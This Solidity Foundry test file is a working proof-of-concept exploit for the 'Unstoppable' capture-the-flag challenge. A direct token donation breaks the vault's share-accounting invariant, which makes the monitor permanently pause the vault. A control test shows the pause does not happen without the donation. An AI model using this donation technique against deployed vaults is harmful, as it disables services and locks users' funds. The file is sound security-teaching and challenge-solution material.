// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import {Test} from "forge-std/Test.sol";
import {DamnValuableToken} from "../src/DamnValuableToken.sol";
import {UnstoppableVault} from "../src/UnstoppableVault.sol";
import {UnstoppableMonitor} from "../src/UnstoppableMonitor.sol";

/// @title UnstoppablePoC — minimal, reproducible exploit for the local
///        DVDF-style "Unstoppable" challenge.
/// @notice Hypothesis: a direct token donation to the vault breaks the
///         `convertToShares(totalSupply) == totalAssets()` invariant that the
///         flash-loan path asserts, and the liveness monitor then permanently
///         pauses the vault. This test *executes* the exploit and asserts the
///         violated security property (liveness).
///
///         Deterministic: no fork, no randomness, fixed actors and amounts.
contract UnstoppablePoC is Test {
    address internal constant DEPLOYER = address(0xD0);
    address internal constant PLAYER = address(0xA11CE);

    uint256 internal constant TOKENS_IN_VAULT = 1_000_000e18;
    uint256 internal constant PLAYER_BALANCE = 10e18;

    DamnValuableToken internal token;
    UnstoppableVault internal vault;
    UnstoppableMonitor internal monitor;

    function setUp() public {
        vm.startPrank(DEPLOYER);
        token = new DamnValuableToken();
        vault = new UnstoppableVault(token, DEPLOYER, DEPLOYER);
        token.mint(DEPLOYER, TOKENS_IN_VAULT);
        token.approve(address(vault), TOKENS_IN_VAULT);
        vault.deposit(TOKENS_IN_VAULT, DEPLOYER);
        token.mint(PLAYER, PLAYER_BALANCE);

        monitor = new UnstoppableMonitor(address(vault));
        vault.transferOwnership(address(monitor));
        // Baseline: the monitor's flash loan succeeds.
        monitor.checkFlashLoan(100e18);
        vm.stopPrank();
    }

    /// @notice The attack: a single transfer from the player breaks the vault.
    function test_exploit_halts_vault_via_donation() public {
        // --- Preconditions -------------------------------------------------
        assertTrue(vault.totalSupply() == vault.totalAssets(), "precondition: supply==assets");
        assertEq(vault.convertToShares(vault.totalSupply()), vault.totalAssets(), "precondition: invariant holds");
        assertFalse(vault.paused(), "precondition: vault live");
        assertEq(vault.owner(), address(monitor), "precondition: monitor owns vault");

        // --- Attack --------------------------------------------------------
        vm.prank(PLAYER);
        // Direct donation: tokens arrive but no shares are minted.
        token.transfer(address(vault), 1e18);

        // The invariant is now broken.
        assertTrue(
            vault.convertToShares(vault.totalSupply()) != vault.totalAssets(),
            "invariant must be broken by the donation"
        );

        // The monitor's next liveness check now fails and shuts the vault down.
        vm.prank(DEPLOYER);
        monitor.checkFlashLoan(100e18);

        // --- Violated security property (liveness / availability) ----------
        assertTrue(vault.paused(), "VIOLATION: vault was permanently paused");
        assertEq(vault.owner(), DEPLOYER, "VIOLATION: ownership seized back to deployer");

        // And the free flash-loan feature is gone: it now reverts.
        vm.prank(DEPLOYER);
        vm.expectRevert();
        vault.flashLoan(address(monitor), address(token), 100e18, bytes(""));
    }

    /// @notice Control: without the donation, the vault stays live. This proves
    ///         the donation (and nothing else) caused the shutdown.
    function test_control_no_donation_vault_stays_live() public {
        vm.prank(DEPLOYER);
        monitor.checkFlashLoan(100e18);
        assertFalse(vault.paused(), "control: vault must stay live without the donation");
        assertEq(vault.owner(), address(monitor), "control: ownership unchanged");
    }
}
